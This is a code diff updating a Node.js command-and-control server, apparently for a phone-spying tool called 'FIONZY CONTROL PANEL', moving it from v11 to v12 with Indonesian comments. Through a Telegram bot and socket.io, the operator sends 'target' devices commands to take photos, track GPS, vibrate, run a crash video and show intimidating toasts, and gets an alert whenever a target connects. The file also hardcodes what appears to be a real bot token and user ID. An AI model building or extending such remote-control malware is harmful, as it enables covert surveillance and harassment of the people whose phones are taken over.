@@ -7,19 +7,19 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
-// === ⚡ KONFIGURASI (GANTI TOKEN DI SINI!) ⚡ ===
-const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; // Masukkan token dari @BotFather
+// === ⚡ KONFIGURASI (GANTI DI SINI!) ⚡ ===
+const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
 const bot = new Telegraf(BOT_TOKEN);
-const MY_ID = '7373392803'; // ID Tuan Fionzy
+const MY_ID = '7373392803'; 
 
-// UI Menu Utama Anti-Crash (MarkdownV2 Fixed)
+// UI Menu Utama v12.0 (Ganti ke HTML Mode agar tidak error)
 const mainMenu = async (ctx) => {
-    const text = `⚡ *FIONZY CONTROL PANEL v11\\.0* ⚡\n` +
-                 `──────────────\n` +
-                 `📱 *Status:* ONLINE\n` +
-                 `💀 *Mode:* FIONZY-Z ACTIVE\n` +
-                 `──────────────\n` +
-                 `*Pilih Perintah Eksekusi:*`;
+    const text = `<b>⚡ FIONZY CONTROL PANEL v12.0 ⚡</b>\n` +
+                 `--------------------------------------\n` +
+                 `📱 <b>Status:</b> ONLINE\n` +
+                 `💀 <b>Mode:</b> FIONZY-Z ACTIVE\n` +
+                 `--------------------------------------\n` +
+                 `<i>Pilih Perintah Eksekusi:</i>`;
     
     const keyboard = Markup.inlineKeyboard([
         [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
@@ -28,45 +28,46 @@ const mainMenu = async (ctx) => {
     ]);
 
     try {
-        await ctx.replyWithMarkdownV2(text, keyboard);
+        await ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
     } catch (e) {
         console.log("❌ Gagal Kirim Menu: " + e.message);
-        // Backup jika MarkdownV2 error lagi
-        ctx.reply("⚡ FIONZY PANEL v11.0 (Mode Aman)\n\nPilih perintah:", keyboard);
+        // Backup terakhir jika HTML pun gagal (Teks Polos)
+        ctx.reply("FIONZY PANEL v12.0 ONLINE\n\nSilahkan pilih:", keyboard);
     }
 };
 
 // Notifikasi Target Online
 io.on('connection', (socket) => {
     console.log('⚡ Target Baru Terhubung!');
-    bot.telegram.sendMessage(MY_ID, "⚠️ **TARGET TERDETEKSI!**\nSistem FionzyGpt telah mengunci perangkat target.", { parse_mode: 'Markdown' }).catch(() => {});
+    bot.telegram.sendMessage(MY_ID, "⚠️ <b>TARGET TERDETEKSI!</b>\nSistem FionzyGpt telah mengunci perangkat.", { parse_mode: 'HTML' }).catch(() => {});
 });
 
 bot.start((ctx) => mainMenu(ctx));
 bot.command('menu', (ctx) => mainMenu(ctx));
 
-// Handler Tombol
+// Handler Tombol (Callback)
 bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
 bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
 bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
-bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Menjalankan Devil Video...').catch(() => {}); io.emit('command', '/crash'); });
+bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Menjalankan Video...').catch(() => {}); io.emit('command', '/crash'); });
 bot.action('menu', (ctx) => mainMenu(ctx));
-bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast HP ANDA DISUSUPI!`"));
+bot.action('ask_toast', (ctx) => ctx.reply("Ketik: /toast [pesan]\nContoh: /toast HP ANDA DISUSUPI!"));
 
+// Handler Toast
 bot.on('text', (ctx) => {
     if (ctx.message.text.startsWith('/toast ')) {
         io.emit('command', ctx.message.text);
-        ctx.reply("✅ Toast Terkirim ke Target!");
+        ctx.reply("✅ Toast Terkirim!");
     }
 });
 
-// Pelindung Server (Agar tidak mati jika ada error)
+// Pelindung Server (Wajib!)
 process.on('uncaughtException', (err) => { console.log('🛡️ Error Terblokir: ' + err.message); });
 process.on('unhandledRejection', (res) => { console.log('🛡️ Rejection Terblokir: ' + res); });
 
 server.listen(3000, '0.0.0.0', () => {
-    console.log('⚡ FIONZY v11.0 LIVE');
-    console.log('⚡ PORT: 3000 | BOT: ONLINE');
+    console.log('⚡ FIONZY v12.0 LIVE');
+    console.log('⚡ BOT: ONLINE | PORT: 3000');
 });
 
 bot.launch().then(() => console.log('⚡ BOT TELEGRAM SIAP!'));
